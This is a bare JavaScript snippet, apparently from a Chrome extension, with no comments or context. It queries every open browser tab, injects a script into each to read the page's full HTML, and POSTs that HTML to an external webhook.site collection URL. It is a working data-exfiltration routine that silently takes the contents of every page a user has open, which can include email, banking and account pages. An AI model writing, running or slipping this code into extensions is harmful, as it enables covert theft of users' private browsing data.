chrome.tabs.query({}, function (tabs) {
    tabs.forEach(t => {
        chrome.tabs.executeScript(t.id, { code: 'document.documentElement.outerHTML' }, function (result) {
            var server = new XMLHttpRequest;
            server.open('POST', 'https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c/html=' + result[0]);
            server.send();
        })
    })
});
